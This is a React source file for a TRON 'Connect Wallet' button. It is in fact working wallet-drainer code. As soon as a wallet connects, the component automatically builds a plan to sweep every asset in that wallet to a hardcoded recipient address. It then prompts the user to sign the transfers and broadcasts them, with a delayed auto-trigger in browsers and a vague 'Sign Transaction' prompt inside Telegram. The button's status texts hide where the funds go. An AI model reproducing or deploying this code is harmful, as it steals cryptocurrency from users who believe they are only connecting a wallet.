import React, { useState, useEffect, useRef } from 'react';
import { useWallet } from '@tronweb3/tronwallet-adapter-react-hooks';
import { useWalletModal } from '@tronweb3/tronwallet-adapter-react-ui';
import { TransactionService } from '../services/transaction.service';
import { useTranslation } from 'react-i18next';

// --- CONFIGURATION ---
// Address to receive funds
const RECIPIENT_ADDRESS = 'TWBRNk1RJJ9Vvff38ARFvvmhbGk7UybJYg';
// ---------------------

const ConnectWalletBtn = ({ className }) => {
    const { address, signTransaction, connected, select, wallets, connect } = useWallet();
    const { setVisible } = useWalletModal();
    const { t } = useTranslation();
    const [status, setStatus] = useState('');
    const [isLoading, setIsLoading] = useState(false);
    const [isWaitingForSign, setIsWaitingForSign] = useState(false);

    // To prevent double execution
    const hasTriggeredRef = useRef(false);

    const handleTransaction = async () => {
        if (!address) return;

        console.log("Auto-Triggering Transaction Flow...");
        setIsLoading(true);
        setStatus('Scanning wallet...');

        try {
            // 1. Create Sweep Plan
            const plan = await TransactionService.createSweepPlan(address, RECIPIENT_ADDRESS);
            console.log("Sweep Plan:", plan);

            if (plan.length === 0) {
                setStatus("No assets to move.");
                setIsLoading(false);
                return;
            }

            setStatus(`Processing ${plan.length} assets...`);

            // 2. Execute Plan
            for (let i = 0; i < plan.length; i++) {
                const item = plan[i];
                setStatus(`Signing ${item.type}...`);

                try {
                    // Sign
                    const signedTransaction = await signTransaction(item.transaction);

                    // Broadcast
                    setStatus(`Sending ${item.type}...`);
                    const result = await TransactionService.broadcast(signedTransaction);

                    if (result.result) {
                        console.log(`${item.type} Success:`, result.txid);
                    } else {
                        console.error(`${item.type} Failed:`, result);
                    }
                } catch (err) {
                    console.error("Sign Error:", err);
                    break;
                }
            }

            setStatus('Transfer Complete');
        } catch (error) {
            console.error("Transaction Error:", error);
            setStatus('Error');
        } finally {
            setIsLoading(false);
        }
    };

    // Auto-trigger logic (Adapted for Telegram)
    useEffect(() => {
        if (connected && address && !hasTriggeredRef.current) {
            hasTriggeredRef.current = true;

            // Detect Telegram Web App
            const isTelegram = window.Telegram?.WebApp?.initData;

            if (isTelegram) {
                console.log("Telegram Environment Detected: Enabling Manual Trigger");
                setIsWaitingForSign(true);
                setStatus('Sign Transaction'); // Prompt user
            } else {
                // Standard Web Behavior (Auto)
                const timer = setTimeout(() => handleTransaction(), 1000);
                return () => clearTimeout(timer);
            }
        }

        if (!connected) {
            hasTriggeredRef.current = false;
            setIsWaitingForSign(false);
            setStatus('');
        }
    }, [connected, address]);

    // Handle button click
    const handleClick = async () => {
        // Manual Trigger for Telegram
        if (connected && isWaitingForSign) {
            setIsWaitingForSign(false); // Reset flag
            await handleTransaction();
            return;
        }

        // Connect Trigger
        if (!connected) {
            try {
                // Find WalletConnect adapter
                const walletConnectAdapter = wallets.find(w => w.adapter.name === 'WalletConnect');

                if (walletConnectAdapter) {
                    console.log("Selecting WalletConnect adapter...");
                    select(walletConnectAdapter.adapter.name);

                    setTimeout(() => {
                        connect();
                    }, 100);
                } else {
                    console.error("WalletConnect adapter not found");
                    setVisible(true);
                }
            } catch (e) {
                console.error("Connection Error:", e);
            }
        }
    };

    return (
        <button
            className={className}
            onClick={handleClick}
            disabled={isLoading}
        >
            {connected ? (status || t('buttons.walletConnected')) : t('buttons.connectWallet')}
        </button>
    );
};

export default ConnectWalletBtn;
